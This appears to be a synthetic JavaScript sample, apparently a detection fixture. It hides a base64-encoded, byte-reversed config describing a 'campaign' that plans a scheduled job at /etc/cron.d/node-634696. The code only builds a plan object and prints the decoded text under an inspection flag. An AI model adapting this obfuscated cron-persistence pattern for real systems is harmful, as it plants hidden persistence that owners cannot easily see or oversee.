  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_9e15571a = "Njk2NDM2LWVkb24vZC5ub3JjL2N0ZS89aHRhcF9lbHVkZWhjc3w1MDY5NjQzNi1FRE9OPWRpX25naWFwbWFjfDE9dG51b2NfZWdhdHN8cm90cGlyY3NlZF9ub3JjPXJldHBhZGF8cm90cGlyY3NlZF9yZXRzaWdlcixlbHVkZWhjc19kbGl1Yj1zcGV0c3wxPXY=";
  const Codec_9e15571a = "base64_chunks|reverse_bytes|";

  function load_9e15571a() { return [...Buffer.from(Material_9e15571a, "base64")]; }
  function decode_9e15571a(EnCoDeD) { return [...EnCoDeD].reverse(); }
  async function recover_9e15571a() {
    const NeUtRaL = 2 > 1 ? "left" : "right";
    const EnCoDeD = load_9e15571a(); let DeCoDeD = [];
    DeCoDeD = await Promise.resolve(EnCoDeD).then(decode_9e15571a);
    void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
  }
  async function inspect_9e15571a() { return (await recover_9e15571a()).split("|").join("|"); }
  async function plan_9e15571a() { const inspect = inspect_9e15571a; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "cron_descriptor", path: fields.schedule_path }); }
  void moduleShape; void plan_9e15571a;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_9e15571a());
